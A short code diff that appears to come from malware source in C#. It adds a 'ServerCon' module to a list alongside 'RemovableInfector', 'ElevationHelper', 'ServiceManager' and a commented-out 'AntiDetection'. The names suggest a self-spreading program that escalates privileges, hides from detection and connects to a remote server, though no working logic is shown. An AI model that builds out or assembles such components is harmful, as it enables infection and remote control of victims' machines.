@@ -12,6 +12,7 @@ namespace zort
                     new RemovableInfector(),
                     new ElevationHelper(),
                     new ServiceManager(),
+                    new ServerCon(),
                     //new AntiDetection(),
                 };
 
